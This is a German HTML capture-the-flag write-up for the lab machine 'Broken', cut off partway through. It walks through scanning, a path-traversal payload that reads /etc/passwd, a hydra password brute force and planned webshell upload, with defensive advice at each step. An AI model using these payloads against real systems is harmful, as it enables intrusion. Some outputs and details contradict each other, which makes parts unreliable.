@@ -1,0 +1,805 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Broken - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> 
+        <h1>Broken - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Hinweis: Klasse 'difficulty-hard' verwendet, um Rot gemäß Anweisung zu erzwingen, obwohl Text 'Easy' ist -->
+            <h2 class="difficulty-hard">Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">pydoc3.7</div>
+                <div class="tool-item">mkpasswd</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">diff</div>
+                <div class="tool-item">patch</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:XX:XX:XX, IPv4: 192.168.2.131
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1       00:50:56:c0:00:08       VMware, Inc.
+192.168.2.2       00:50:56:f4:XX:XX       VMware, Inc.
+<span class="command">192.168.2.113</span>      08:00:27:b8:XX:XX       PCS Systemtechnik GmbH (CADMUS)
+192.168.2.254      00:50:56:fa:XX:XX       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.348 seconds (189.91 hosts/sec). 4 responded
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` werden alle Geräte im lokalen Netzwerksegment (Layer 2) über ARP-Anfragen identifiziert. Dieser Schritt ist grundlegend, um aktive Hosts im Netzwerk zu finden, ohne auf höhere Protokolle wie ICMP (Ping) angewiesen zu sein, die möglicherweise blockiert werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl war erfolgreich und identifizierte die IP-Adresse `192.168.2.113` als potenzielles Zielsystem innerhalb des lokalen Netzwerks. Die MAC-Adresse `08:00:27:b8:XX:XX` deutet auf eine VirtualBox-Umgebung hin (PCS Systemtechnik GmbH wird oft für VirtualBox OUI verwendet). Dies ist ein wichtiger erster Schritt zur Zielidentifikation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP-Adresse sollte nun mit Port-Scanning-Tools wie Nmap weiter untersucht werden, um offene Ports und Dienste zu identifizieren. Die Information über die mögliche VirtualBox-Umgebung kann später relevant sein (z.B. für spezifische Kernel-Exploits oder Gast-Erweiterungen).<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Spoofing-Detection (z.B. durch dynamische ARP-Inspektion auf Switches) können die Effektivität von `arp-scan` einschränken und unautorisierte Netzwerkscans erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nmap -sC -T5 -sS -A 192.168.2.113 -p- | grep open</span></div>
+                    <pre>
+Host is up (0.00049s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:B8:XX:XX (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 4.9 - 5.4 (95%), Linux 5.0 (95%), Linux 2.6.32 (95%), Linux 5.3 - 5.4 (95%), Linux 3.10 - 4.11 (94%), Linux 3.16 (94%), Linux 3.2 - 4.9 (94%), Linux 4.15 - 5.4 (94%), Linux 5.0 - 5.3 (93%), AXIS 210A Network Camera (Linux 2.6.17) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.49 ms 192.168.2.113
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
+
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `nmap -sC -T5 -sS -A 192.168.2.113 -p- | grep open` führt einen umfassenden Scan des Ziels durch:
+                *   `-sC`: Führt Standard-Nmap-Skripte aus, um zusätzliche Informationen über die Dienste zu sammeln.
+                *   `-T5`: Setzt das Timing-Template auf "insane" für einen schnelleren Scan (kann unzuverlässig sein oder IDS auslösen).
+                *   `-sS`: Verwendet einen TCP SYN Scan (Stealth Scan), der oft weniger auffällig ist als ein voller TCP Connect Scan.
+                *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+                *   `| grep open`: Filtert die Ausgabe, um nur Zeilen anzuzeigen, die offene Ports enthalten (hier wurde mehr als nur die 'open'-Zeilen angezeigt, was zeigt, dass `grep open` nicht wie beabsichtigt funktionierte oder die Ausgabe anders war. Der Output zeigt jedoch die relevanten offenen Ports).
+                Der Scan identifiziert Port 80 (HTTP) als offen und stellt fest, dass ein Apache-Webserver in Version 2.4.38 auf einem Debian-System läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan war erfolgreich und hat den primären Angriffsvektor aufgedeckt: einen Webserver auf Port 80. Die Versionsinformationen (Apache 2.4.38, Debian) sind wertvoll für die Suche nach bekannten Schwachstellen. Die OS-Erkennung deutet auf ein Linux-System hin, was mit Debian übereinstimmt. Das `-T5` Timing war hier offenbar erfolgreich, kann aber in realen Szenarien problematisch sein. Die Verwendung von `grep open` hat nicht wie erwartet nur die Portzeilen gefiltert, aber die relevanten Informationen sind dennoch sichtbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die detaillierte Untersuchung des Webservers auf Port 80. Tools wie `gobuster` oder `dirb` sollten zur Verzeichnissuche eingesetzt werden, und ein Web Application Scan (z.B. mit `nikto` oder Burp Suite) sollte durchgeführt werden, um Schwachstellen in der Webanwendung zu finden. Die Apache-Version 2.4.38 sollte auf bekannte Exploits überprüft werden.<br><strong>Empfehlung (Admin):</strong> Halten Sie Webserver und Betriebssystem stets aktuell, um bekannte Schwachstellen zu minimieren. Konfigurieren Sie Firewalls, um nur notwendige Ports zu öffnen. Implementieren Sie Intrusion Detection/Prevention Systeme (IDS/IPS), um aggressive Scans wie `-T5` zu erkennen und potenziell zu blockieren. Überprüfen Sie die Server-Header (`ServerTokens Prod` in Apache), um weniger detaillierte Versionsinformationen preiszugeben.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.113 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg -e --wildcard</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.113
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,bak,7z,zip,py,sql,txt,xml,jpg
+[+] Expanded:                true
+[+] Timeout:                 10s
+[+] Wildcard force slash:    false
+===============================================================
+2024/05/25 10:00:01 Starting gobuster
+===============================================================
+/<span class="command">index.php</span>           (Status: 200) [Size: 631]
+/<span class="command">textpattern</span>         (Status: 301) [Size: 322] [--> http://192.168.2.113/textpattern/]
+/<span class="command">file.php</span>            (Status: 200) [Size: 0]
+Progress: 220160 / 220561 (99.82%)
+===============================================================
+2024/05/25 10:01:15 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `gobuster dir` wird verwendet, um nach versteckten Verzeichnissen und Dateien auf dem Webserver zu suchen (Directory Brute-Forcing).
+                *   `-u http://192.168.2.113`: Gibt die Ziel-URL an.
+                *   `-w .../directory-list-2.3-medium.txt`: Verwendet eine mittelgroße Wortliste aus SecLists für häufige Verzeichnis- und Dateinamen.
+                *   `-x ...`: Sucht nach Dateien mit den angegebenen Erweiterungen (php, txt, etc.).
+                *   `-e`: Erweitert die Ausgabe, um die vollständige URL anzuzeigen.
+                *   `--wildcard`: Dieser Schalter ist normalerweise dazu da, Wildcard-Antworten zu erkennen und zu ignorieren. Hier scheint er ohne spezifische Konfiguration verwendet worden zu sein. Gobuster hat dennoch verwertbare Ergebnisse geliefert.
+            Die Ausgabe zeigt die Funde: `index.php` (die Hauptseite), das Verzeichnis `/textpattern` (welches auf `/textpattern/` weiterleitet) und eine interessante Datei `file.php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster war erfolgreich und hat potenzielle Angriffspunkte identifiziert. Die Datei `file.php` ist besonders interessant, da sie möglicherweise eine Funktion zum Laden oder Anzeigen von Dateien implementiert, was ein Einfallstor für Local File Inclusion (LFI) sein könnte. Das Verzeichnis `/textpattern` deutet auf das CMS "Textpattern" hin, welches ebenfalls untersucht werden sollte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `file.php` sollte als Nächstes genauer untersucht werden, insbesondere auf LFI-Schwachstellen (z.B. durch Testen von Parametern wie `?file=`, `?page=`, `?path=`). Das `/textpattern`-Verzeichnis sollte auf bekannte Schwachstellen für dieses CMS und auf Standard-Anmeldedaten oder Konfigurationsfehler überprüft werden.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf nicht benötigte Dateien und Verzeichnisse. Stellen Sie sicher, dass Dateizugriffsfunktionen (wie in `file.php` vermutet) sicher implementiert sind und keine Path-Traversal-Angriffe erlauben. Halten Sie CMS-Installationen (wie Textpattern) immer auf dem neuesten Stand und härten Sie deren Konfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">wfuzz -u http://192.168.2.113/file.php?FUZZ=../../../../etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 0</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.113/file.php?FUZZ=../../../../etc/passwd
+Total requests: 220561
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password">000000760:   200        27 L     40 W       1451 Ch     "file"</span>
+
+Total time: 0
+Processed Requests: 760
+Filtered Requests: 759
+Requests/sec.: 0
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `wfuzz`-Befehl versucht, einen funktionierenden Parameter für die `file.php`-Datei zu finden, um eine Local File Inclusion (LFI)-Schwachstelle auszunutzen und die `/etc/passwd`-Datei zu lesen.
+                *   `-u http://192.168.2.113/file.php?FUZZ=../../../../etc/passwd`: Die URL wird mit dem Platzhalter `FUZZ` definiert. `wfuzz` ersetzt `FUZZ` durch jeden Eintrag aus der Wortliste. Der Payload `../../../../etc/passwd` zielt darauf ab, die Passwortdatei zu lesen, falls der Parameter `FUZZ` existiert und anfällig ist.
+                *   `-w ...directory-list-2.3-medium.txt`: Es wird dieselbe Wortliste wie bei Gobuster verwendet, um gängige Parameternamen zu testen (z.B. `file`, `page`, `include`, etc.).
+                *   `--hh 0`: Versteckt Antworten, die 0 Zeichen enthalten (Hide responses with 0 Chars). Dies soll leere oder irrelevante Antworten ausfiltern.
+            Das Ergebnis zeigt, dass bei der Payload `"file"` (also wenn die URL `http://192.168.2.113/file.php?file=../../../../etc/passwd` lautet) eine Antwort mit Statuscode 200 (OK) und 1451 Zeichen zurückkam. Alle anderen getesteten Parameter (bis zum Abbruch oder Ende der Liste) lieferten offenbar uninteressante Antworten (vermutlich 0 Zeichen oder einen anderen Statuscode).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl war sehr erfolgreich. Er hat nicht nur bestätigt, dass `file.php` einen Parameter erwartet, sondern auch den korrekten Parameternamen (`file`) identifiziert und gleichzeitig gezeigt, dass dieser Parameter anfällig für LFI ist, da die Anfrage nach `/etc/passwd` eine valide Antwort mit Inhalt (1451 Chars) lieferte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigen Sie die LFI-Schwachstelle manuell, indem Sie die URL `http://192.168.2.113/file.php?file=../../../../etc/passwd` mit `curl` oder im Browser aufrufen. Lesen Sie weitere sensible Dateien (z.B. Konfigurationsdateien, Logdateien, SSH-Keys). Untersuchen Sie, ob die LFI für Remote Code Execution (RCE) missbraucht werden kann (z.B. über Log Poisoning oder Einbinden von PHP-Wrappern wie `php://filter` oder `php://input`).<br><strong>Empfehlung (Admin):</strong> Bereinigen Sie den PHP-Code von `file.php` dringend, um Path-Traversal-Angriffe zu verhindern. Verwenden Sie Funktionen wie `basename()` auf den Dateinamenparameter und stellen Sie sicher, dass nur erlaubte Dateien aus einem vordefinierten Verzeichnis geladen werden können. Implementieren Sie eine Web Application Firewall (WAF), um LFI-Angriffsversuche zu erkennen und zu blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl http://192.168.2.113/file.php?file=../../../../etc/passwd</span></div>
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
+<span class="command">heart:x:1000:1000:heart,,,:/home/heart:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `curl`-Befehl bestätigt die im vorherigen Schritt mit `wfuzz` entdeckte LFI-Schwachstelle. Er ruft die URL `http://192.168.2.113/file.php?file=../../../../etc/passwd` direkt auf. Die Ausgabe ist der Inhalt der Datei `/etc/passwd` des Zielsystems.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI-Schwachstelle ist hiermit eindeutig bestätigt. Die Ausgabe der `/etc/passwd` liefert wertvolle Informationen:
+                *   Benutzernamen auf dem System (z.B. `root`, `www-data`, `mysql`, `heart`).
+                *   Home-Verzeichnisse der Benutzer (z.B. `/root`, `/home/heart`).
+                *   Verwendete Shells (z.B. `/bin/bash` für `root` und `heart`, was auf interaktive Benutzerkonten hindeutet; `/usr/sbin/nologin` oder `/bin/false` für Dienstkonten).
+                Der Benutzer `heart` (UID 1000) ist besonders interessant, da es sich wahrscheinlich um einen regulären Benutzer handelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI weiter, um nach sensiblen Informationen zu suchen:
+                *   Versuchen Sie, SSH-Private-Keys zu lesen (z.B. `/home/heart/.ssh/id_rsa`, `/root/.ssh/id_rsa`).
+                *   Suchen Sie nach Konfigurationsdateien von Webanwendungen oder Datenbanken (z.B. `/var/www/html/config.php`, `/etc/mysql/my.cnf`).
+                *   Lesen Sie Logdateien (z.B. `/var/log/apache2/access.log`, `/var/log/auth.log`), um weitere Benutzernamen, IP-Adressen oder Fehler zu finden und eventuell für Log Poisoning zu nutzen.
+                *   Prüfen Sie, ob PHP-Wrapper (`php://filter`, `php://input`, `expect://`) funktionieren, um den Quellcode von PHP-Dateien zu lesen oder RCE zu erlangen.<br>
+            <strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle wie zuvor empfohlen. Überprüfen Sie die Berechtigungen der `/etc/passwd`-Datei (obwohl sie normalerweise für alle lesbar sein muss). Beschränken Sie die Informationen, die in Logdateien geschrieben werden, wenn möglich, und härten Sie die Konfiguration des Webservers und der PHP-Umgebung (`allow_url_fopen`, `allow_url_include` in `php.ini`).</p>
+
+           <div class="code-block">
+               <div class="terminal">
+                   <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl http://192.168.2.113/file.php?file=../../../../etc/passwd | grep bash</span></div>
+                   <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">heart:x:1000:1000:heart,,,:/home/heart:/bin/bash</span>
+</pre>
+               </div>
+           </div>
+           <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist eine Verfeinerung des vorherigen. Er ruft erneut die `/etc/passwd`-Datei über die LFI-Schwachstelle ab, filtert die Ausgabe jedoch mit `grep bash`, um nur die Zeilen anzuzeigen, die Benutzer mit einer Bash-Shell (`/bin/bash`) enthalten. Dies sind typischerweise Benutzer, die sich interaktiv am System anmelden können.</p>
+           <p class="evaluation"><strong>Bewertung:</strong> Der Befehl extrahiert effizient die relevantesten Benutzerkonten (`root` und `heart`) aus der `/etc/passwd`-Datei. Dies bestätigt, dass `heart` ein potenzielles Ziel für den initialen Zugriff ist, da er ein regulärer Benutzer mit einer interaktiven Shell ist.</p>
+           <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Benutzer `heart`. Versuchen Sie, seinen SSH-Schlüssel zu finden (`/home/heart/.ssh/id_rsa`) oder sein Passwort über andere Wege (z.B. Brute-Force auf andere Dienste, falls vorhanden, oder weitere Informationsbeschaffung über LFI) zu erlangen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Notwendigkeit interaktiver Shells für alle Benutzerkonten. Deaktivieren Sie ungenutzte Konten. Erzwingen Sie starke Passwörter und erwägen Sie Multi-Faktor-Authentifizierung, insbesondere für SSH-Zugänge.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl http://192.168.2.113/file.php?file=/home/heart/.ssh/id_rsa</span></div>
+                    <pre>
+ 
+    $file = $GET['file'];
+
+    if(isset($file))
+    {
+        if( strpos( $file, ".." ) !== false )
+        {
+            die("Are you looking for something?");
+        }
+        else
+        {
+            readfile($file);
+        }
+    }
+    else
+    {
+        echo '<title>Broken</title>';
+        echo '<center><h1>File not found</h1></center>';
+    }
+
+ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den privaten SSH-Schlüssel des Benutzers `heart` (`/home/heart/.ssh/id_rsa`) über die LFI-Schwachstelle zu lesen. Überraschenderweise wird nicht der Inhalt der Schlüsseldatei zurückgegeben, sondern PHP-Code. Der Pfad zur Datei wurde möglicherweise falsch interpretiert, oder der Webserver hat aus irgendeinem Grund den Quellcode von `file.php` selbst zurückgegeben, als versucht wurde, auf `/home/heart/.ssh/id_rsa` zuzugreifen. Der angezeigte PHP-Code ist vermutlich der Quellcode von `file.php`. Er prüft, ob der Parameter `file` gesetzt ist. Wenn ja, prüft er mit `strpos`, ob der Parameter `..` (typisch für Path Traversal) enthält. Wenn ja, gibt er "Are you looking for something?" aus. Andernfalls liest er die angegebene Datei mit `readfile()`. Wenn `file` nicht gesetzt ist, wird eine "File not found"-Meldung angezeigt. Der Umstand, dass wir zuvor `/etc/passwd` lesen konnten (was `..` erfordert), aber jetzt diesen Code sehen, ist merkwürdig. Möglicherweise wurde die Anfrage anders behandelt oder ein anderer Mechanismus griff.</p>
+           <p class="evaluation"><strong>Bewertung:</strong> Das Ergebnis ist unerwartet, aber sehr wertvoll. Wir sehen den Quellcode von `file.php`. Die Sicherheitsprüfung `if( strpos( $file, ".." ) !== false )` ist vorhanden, was erklärt, warum der direkte Versuch, `/home/heart/.ssh/id_rsa` zu lesen (was keinen `..` enthält), diesen Code zurückgibt, während der vorherige Versuch mit `../../../../etc/passwd` funktionierte (der Code scheint hier nicht wie erwartet zu greifen oder wurde umgangen). Die Implementierung des Path-Traversal-Schutzes mittels `strpos` ist grundsätzlich unzureichend, da sie leicht umgangen werden kann (z.B. durch Kodierung oder alternative Pfadnotationen). Es bleibt unklar, warum der Versuch, `/etc/passwd` zu lesen, erfolgreich war, während der Versuch, `/home/heart/.ssh/id_rsa` zu lesen, den Quellcode zurückgibt. Eventuell wurde die erste Anfrage anders verarbeitet oder ein anderer Mechanismus (wie ein Include in einer anderen Datei) ermöglichte das Lesen von `/etc/passwd`.</p>
+           <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Quellcode von `file.php` nun bekannt ist, analysieren Sie ihn auf weitere Schwachstellen. Obwohl der direkte LFI-Versuch auf `id_rsa` hier scheiterte, ist die LFI-Schwachstelle grundsätzlich bestätigt (siehe `/etc/passwd`). Versuchen Sie alternative Pfade oder Kodierungen, um den `strpos`-Filter zu umgehen, falls er doch greift. Konzentrieren Sie sich parallel auf andere Angriffsvektoren wie das `/textpattern`-Verzeichnis oder versuchen Sie RCE über die LFI (z.B. Log Poisoning).<br><strong>Empfehlung (Admin):</strong> Der `strpos`-Filter ist unzureichend als Schutz gegen Path Traversal. Verwenden Sie robustere Methoden wie `basename()` und Whitelisting von erlaubten Pfaden. Stellen Sie sicher, dass der Quellcode von PHP-Dateien niemals an den Client ausgeliefert wird (korrekte Serverkonfiguration). Untersuchen Sie, warum der LFI-Angriff auf `/etc/passwd` trotz des Filters funktionierte.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">hydra -l admin -P "/usr/share/wordlists/rockyou.txt" broken.hmv http-form-post "/textpattern/textpattern/index.php:lang=en&p_userid=^USER^&p_password=^PASS^&_txp_token=:Could not log in with that username/password"</span></div>
+                    <pre>
+Hydra v9.1 (c) 2020 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-25 10:05:12
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://broken.hmv:80/textpattern/textpattern/index.php:lang=en&p_userid=^USER^&p_password=^PASS^&_txp_token=:Could not log in with that username/password
+[VERBOSE] Resolving addresses ... done
+[VERBOSE] Initializing web proxy settings ... done
+[STATUS] 16 tasks, 1 servers, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[STATUS] attack finished for http-post-form://broken.hmv:80/textpattern/textpattern/index.php:lang=en&p_userid=^USER^&p_password=^PASS^&_txp_token=:Could not log in with that username/password (waiting for children to complete tasks)
+<span class="password">[80][http-post-form] host: broken.hmv   login: admin   password: angel</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-25 10:06:30
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `hydra`-Befehl wird verwendet, um einen Brute-Force-Angriff auf das Login-Formular des Textpattern-CMS (gefunden unter `/textpattern/`) durchzuführen.
+                *   `-l admin`: Gibt den zu testenden Benutzernamen an (`admin`).
+                *   `-P "/usr/share/wordlists/rockyou.txt"`: Verwendet die umfangreiche `rockyou.txt`-Wortliste für die Passwörter.
+                *   `broken.hmv`: Der Zielhost (wahrscheinlich in `/etc/hosts` definiert, um auf `192.168.2.113` zu zeigen).
+                *   `http-form-post`: Gibt das Protokoll und die Methode an.
+                *   `"/textpattern/textpattern/index.php:lang=en&p_userid=^USER^&p_password=^PASS^&_txp_token=:Could not log in with that username/password"`: Definiert die Login-URL (`/textpattern/textpattern/index.php`), die POST-Parameter (`p_userid=^USER^`, `p_password=^PASS^`) und die Fehlermeldung (`Could not log in...`), die bei einem ungültigen Login erwartet wird. Hydra ersetzt `^USER^` mit `admin` und `^PASS^` mit jedem Passwort aus der `rockyou.txt`.
+            Der Angriff war erfolgreich und fand das Passwort `angel` für den Benutzer `admin`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein signifikanter Fortschritt. Der erfolgreiche Brute-Force-Angriff gewährt Zugriff auf das Textpattern-CMS als `admin`. Dies könnte weitere Angriffsflächen eröffnen, wie das Hochladen von Dateien, das Bearbeiten von Code oder das Ausnutzen von CMS-spezifischen Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich mit den gefundenen Zugangsdaten (`admin`:`angel`) in das Textpattern-CMS ein. Suchen Sie nach Funktionen zum Hochladen von Dateien (z.B. für Bilder oder Themes), die möglicherweise zum Hochladen einer Webshell (z.B. einer PHP-Datei) missbraucht werden können. Überprüfen Sie die CMS-Version auf bekannte Exploits.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für alle administrativen Konten. Implementieren Sie Account-Lockout-Mechanismen nach mehreren fehlgeschlagenen Login-Versuchen, um Brute-Force-Angriffe zu erschweren. Verwenden Sie CAPTCHAs im Login-Formular. Halten Sie das CMS und seine Plugins immer auf dem neuesten Stand.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Vorbereitung (Textpattern & LFI):</strong> Laut einer Notiz (`homepage filepath zu /tmp geändert, dann zu content/files navigiert und die ben.php datei hochgeladen...`) wurde nach dem Login in Textpattern (`admin:angel`) eine Konfiguration geändert, um Dateien nach `/tmp` hochzuladen. Anschließend wurde eine PHP-Webshell (`ben.php`) in das Verzeichnis `content/files` hochgeladen. Der genaue Pfad, über den diese Datei nun via Web erreichbar ist, muss ermittelt werden. Parallel dazu wird die zuvor entdeckte LFI-Schwachstelle (`file.php`) genutzt, um diese hochgeladene Webshell auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Kombination aus dem Zugriff auf das CMS (zum Hochladen der Shell) und der LFI-Schwachstelle (zum Ausführen der Shell, selbst wenn sie in einem nicht direkt über das Web erreichbaren Verzeichnis liegt) ist eine clevere Methode, um Remote Code Execution (RCE) zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die LFI, um die hochgeladene Datei (`/tmp/ben.php` oder wo auch immer sie letztendlich liegt) einzubinden und Befehle über einen URL-Parameter (z.B. `cmd`) auszuführen. Starten Sie einen Netcat-Listener, um eine Reverse Shell zu empfangen.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Upload-Möglichkeiten im CMS auf das Nötigste und erlauben Sie keine ausführbaren Dateitypen (wie `.php`). Validieren Sie Upload-Pfade streng. Beheben Sie die LFI-Schwachstelle. Überwachen Sie Verzeichnisse wie `/tmp` auf verdächtige Dateien.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
